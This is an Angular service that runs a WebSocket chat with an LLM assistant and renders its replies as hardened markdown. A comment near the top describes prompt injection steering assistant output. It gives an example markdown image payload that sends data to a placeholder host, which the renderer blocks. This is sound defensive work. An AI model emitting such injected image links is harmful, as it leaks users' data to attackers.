import { Injectable, computed, effect, inject, signal } from '@angular/core';
import {
    AsyncHandler,
    OrganisationService,
    SettingsService,
    currentUser,
    i18n,
    log,
    notifyError,
    randomString,
} from '@placeos/common';
import { apiKey, getModule, token } from '@placeos/ts-client';

import { Marked, Renderer } from 'marked';

export interface ChatMessage {
    id: string;
    chat_id: string;
    user_id: string;
    message: string;
    content: string;
    function?: string;
    timestamp: number;
}

/** Frame from the chat socket. The server can leave out any field. */
interface ChatFrame {
    type?: string;
    chat_id?: string;
    user_id?: string;
    message?: string;
    function?: string;
    task_id?: string;
}

/** Time without frames before an idle chat closes */
const IDLE_TIMEOUT = 55 * 1000;
/** Time without frames before the chat stops waiting for a reply */
const REPLY_TIMEOUT = 5 * 60 * 1000;

const escapeHtml = (text: string) =>
    text.replace(
        /[&<>"']/g,
        (c) =>
            ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' })[c] ||
            '&#39;',
    );

/**
 * Markdown for assistant output. Assistant text can be steered by data the
 * assistant reads, so images and raw HTML show as text. This stops the
 * browser loading attacker URLs, such as `![](https://x.example/?data=...)`.
 */
const chat_markdown = new Marked({
    useNewRenderer: true,
    // Inline tags such as `<code>` stop marked escaping the text after them,
    // so do not read inline HTML. It shows as escaped text.
    tokenizer: { tag: () => undefined },
    renderer: {
        html: ({ text }) => escapeHtml(text),
        // marked has already escaped the image text
        image: ({ text }) => text,
        // Open links in a new tab, with no access to this page
        link(token) {
            return Renderer.prototype.link
                .call(this, token)
                .replace(
                    /^<a /,
                    '<a target="_blank" rel="noopener noreferrer" ',
                );
        },
    },
});

@Injectable({
    providedIn: 'root',
})
export class ChatService extends AsyncHandler {
    private _org = inject(OrganisationService);
    private _settings = inject(SettingsService);

    private _binding = signal('');
    private _chat_messages = signal<ChatMessage[]>([]);
    private _progress_message = signal<ChatMessage | null>(null);
    private _unsent = signal('');
    private _chat_system = computed(() => {
        const bld = this._org.active_building();
        const bind_id = this._binding();
        if (!bld?.id) return '';
        const binding = this._org.binding('chat_room');
        const system_id = binding instanceof Object ? binding.id : binding;
        return bind_id || system_id;
    });
    private _chat_id = '';

    public chat_hint = signal('');
    private _socket?: WebSocket;

    public readonly messages = this._chat_messages.asReadonly();
    public readonly progress = this._progress_message.asReadonly();
    /** Text of messages that got no reply, so the user can send it again */
    public readonly unsent = this._unsent.asReadonly();

    public get connected() {
        return !!this._socket;
    }

    constructor() {
        super();
        effect(() => {
            const id = this._chat_system();
            if (id) this._bindHint(id);
        });
    }

    public setBinding(system_id: string) {
        this._binding.set(system_id);
    }

    public startChat() {
        if (this._socket) return;
        const id = this._chat_system();
        if (!id) return;
        const auth =
            token() !== 'x-api-key'
                ? `bearer_token=${encodeURIComponent(token())}`
                : `x-api-key=${apiKey()}`;
        const url = `ws${location.origin.replace(
            'http',
            '',
        )}/api/engine/v2/chatgpt/chat/${encodeURIComponent(id)}?${auth}${
            this._chat_id ? '&resume=' + encodeURIComponent(this._chat_id) : ''
        }`;
        log('CHAT', 'Starting chat connection.');
        const socket = new WebSocket(url);
        this._socket = socket;
        socket.onmessage = (event) => {
            let msg: ChatFrame = {};
            try {
                msg = JSON.parse(event.data);
            } catch {}
            this._onMessage(msg);
        };
        socket.onerror = (e) => {
            log('CHAT', 'Connection error:', [e], 'error');
            this._onClose(socket);
        };
        socket.onclose = () => this._onClose(socket);
        return () => this.endChat();
    }

    public endChat() {
        log('CHAT', 'Dropping chat connection.');
        this._socket?.close();
        this._cleanup();
    }

    public close() {
        this.endChat();
        this._chat_id = '';
        this._chat_messages.set([]);
        this._progress_message.set(null);
    }

    /**
     * Sends a message to the chat. Opens a new connection first if the chat
     * has ended, for example after the idle timeout or `close()`.
     * Returns `false` and shows an error if no chat system is set, so the
     * caller can keep the message. If the connection closes before a reply
     * arrives, an error shows and the message text moves to `unsent`.
     */
    public sendMessage(message: string): boolean {
        if (!message) return false;

        const current = this._socket;
        if (!current || current.readyState >= WebSocket.CLOSING) {
            this._cleanup(current);
            this.startChat();
        }
        const socket = this._socket;
        if (!socket) {
            notifyError(i18n('APP.WORKPLACE.CHAT_SEND_FAILED'));
            return false;
        }
        this._unsent.set('');
        this._onMessage({ chat_id: '', message, user_id: currentUser().id });
        // Sending before the socket opens throws, so wait for it to open.
        // A socket that fails before it opens fires `close`, which fails
        // the reply.
        if (socket.readyState === WebSocket.CONNECTING) {
            socket.addEventListener('open', () => socket.send(message), {
                once: true,
            });
        } else socket.send(message);
        return true;
    }

    /**
     * Ends the chat when no frame arrives in time. While a reply is due it
     * waits longer, then gives up and shows an error.
     */
    private _timeoutSocket() {
        this.timeout(
            'socket',
            () => {
                this.endChat();
                this._failReply();
            },
            this._awaitingReply() ? REPLY_TIMEOUT : IDLE_TIMEOUT,
        );
    }

    /** Forget the socket. With a socket given, only if it is still the current one. */
    private _cleanup(socket?: WebSocket) {
        if (socket && socket !== this._socket) return;
        this._socket = null;
        this.clearTimeout('socket');
    }

    /** Handle a socket that closed or failed. A newer chat may already be open. */
    private _onClose(socket: WebSocket) {
        if (socket !== this._socket) return;
        this._cleanup();
        this._failReply();
    }

    /** Whether the last message is from the user, so a reply is due */
    private _awaitingReply() {
        const list = this._chat_messages();
        return (
            list.length > 0 &&
            list[list.length - 1].user_id === currentUser().id
        );
    }

    /**
     * The reply to the user's last messages cannot arrive. Shows an error and
     * moves those messages from the chat to `unsent`, so the user can send
     * them again.
     */
    private _failReply() {
        const list = this._chat_messages();
        const user_id = currentUser().id;
        let start = list.length;
        // Bounded by the list length
        while (start > 0 && list[start - 1].user_id === user_id) start--;
        if (start === list.length) return;
        this._unsent.set(
            list
                .slice(start)
                .map((msg) => msg.message)
                .join('\n'),
        );
        this._chat_messages.set(list.slice(0, start));
        this._progress_message.set(null);
        notifyError(i18n('APP.WORKPLACE.CHAT_SEND_FAILED'));
    }

    private _onMessage(msg: ChatFrame) {
        if (!(msg instanceof Object)) return;
        if (msg.chat_id) this._chat_id = msg.chat_id;
        // Progress frames can have only a function name and no text
        const message = typeof msg.message === 'string' ? msg.message : '';
        if (msg.type === 'progress') {
            this._progress_message.set({
                id: `msg-${randomString(6)}`,
                chat_id: msg.chat_id,
                message,
                content: chat_markdown.parse(message, {
                    async: false,
                }) as string,
                user_id: msg.user_id || 'assistant',
                function: msg.function,
                timestamp: Date.now(),
            });
            if (msg.function === 'task_complete') {
                this._settings.post('CHAT:task_complete', msg.task_id);
            }
        } else {
            if (message) {
                this._chat_messages.set([
                    ...this._chat_messages(),
                    {
                        id: `msg-${randomString(6)}`,
                        chat_id: msg.chat_id,
                        message,
                        content: chat_markdown.parse(message, {
                            async: false,
                        }) as string,
                        user_id: msg.user_id || 'assistant',
                        timestamp: Date.now(),
                    },
                ]);
            }
            if (msg.type === 'response') {
                this._progress_message.set(null);
            }
        }
        this._timeoutSocket();
    }

    private _bindHint(id: string) {
        const mod = getModule(id, 'LLM');
        const binding = mod.variable('user_hint');
        this.subscription(`binding:LLM:user_hint`, binding.bind());
        this.subscription(
            `listen:LLM:user_hint`,
            binding.listen().subscribe((value) => this.chat_hint.set(value)),
        );
    }
}
